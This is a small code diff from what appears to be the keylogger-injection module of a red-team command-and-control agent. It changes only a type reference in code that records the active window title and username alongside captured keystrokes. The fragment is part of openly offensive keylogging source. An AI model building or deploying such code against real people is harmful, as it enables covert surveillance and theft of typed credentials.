@@ -525,7 +525,7 @@ namespace KeylogInject
                             GetWindowText(hWindow, title, title.Capacity);
                         
 
-                        LogMessage(new KeylogInformation
+                        LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
                         {
                             Username = Username,
                             WindowTitle = title.ToString(),
